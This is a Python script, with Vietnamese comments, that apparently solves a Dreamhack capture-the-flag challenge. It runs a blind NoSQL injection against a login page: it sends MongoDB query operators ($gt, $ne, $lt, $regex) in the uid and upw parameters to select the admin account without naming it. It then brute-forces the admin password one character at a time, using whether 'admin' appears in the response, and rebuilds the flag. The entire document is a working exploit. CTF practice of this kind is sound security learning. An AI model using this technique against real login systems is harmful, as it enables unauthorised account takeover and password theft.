import requests
import string
import time
import re
from requests.exceptions import RequestException, ConnectionError

# --- Cấu hình ---
BASE_URL = "http://host3.dreamhack.games:24412/login"
TIMEOUT = 5              # timeout cho mỗi request

# Charset dùng để dò
charset = string.digits + string.ascii_uppercase + string.ascii_lowercase + "{}_-"

# Nếu flag có tiền tố "DH" và server chặn "dh", để "DH" ở đây.
SKIP_PREFIX = "DH"

# Số ký tự sau SKIP_PREFIX cần dò
EXPECTED_LENGTH_AFTER_PREFIX = 34   # đổi thành 34 để đủ flag (vì có thêm kí tự DH)

# --- Hàm chính ----
def find_password_suffix():
    result = ""   # phần suffix sau SKIP_PREFIX mà ta sẽ dò
    target_len = EXPECTED_LENGTH_AFTER_PREFIX
    skip_len = len(SKIP_PREFIX)

    print("Starting bruteforce. BASE_URL =", BASE_URL)
    print("NOTE: using uid conditions to select admin without sending 'admin' directly.")
    print(f"SKIP_PREFIX = {repr(SKIP_PREFIX)}, expecting {target_len} chars after that.")
    print("Charset length:", len(charset), "->", charset)

    for pos in range(target_len):
        found = False
        for c in charset:
            candidate = result + c
            escaped_candidate = re.escape(candidate)

            if skip_len > 0:
                regex_prefix = "^.{" + str(skip_len) + "}" + escaped_candidate
            else:
                regex_prefix = "^" + escaped_candidate

            params = {
                "uid[$gt]": "adm",
                "uid[$ne]": "guest",
                "uid[$lt]": "d",
                "upw[$regex]": regex_prefix
            }

            try:
                r = requests.get(BASE_URL, params=params, timeout=TIMEOUT)
            except (ConnectionError, RequestException) as e:
                print(f"[WARN] Request failed at pos {pos}, char '{c}': {e}")
                time.sleep(1)
                continue  # bỏ qua ký tự này, thử tiếp

            txt = r.text.lower()

            # Nếu trang chứa chữ "admin" => regex khớp, ký tự đúng
            if "admin" in txt:
                result += c
                print()
                print(f"[FOUND] pos {pos:02d}: '{c}' -> current suffix: {result}")
                print(" params sent:", params)
                print(" response snippet:", r.text[:400].replace("\n", " "))
                found = True
                break
            else:
                print(f"pos {pos:02d} try '{c}'", end="\r", flush=True)

        if not found:
            print()
            print(f"[WARN] No char found for position {pos}.")
            print("- Try expanding charset or adjusting SKIP_PREFIX / EXPECTED_LENGTH_AFTER_PREFIX")
            print("- Check server availability or filtering rules")
            return result

    return result


if __name__ == "__main__":
    suffix = find_password_suffix()
    if suffix is None:
        print("Bruteforce aborted due to errors.")
    else:
        flag = SKIP_PREFIX + suffix
        print()
        print("=== DONE ===")
        print("Recovered suffix:", suffix)
        print("FLAG (reconstructed):", flag)
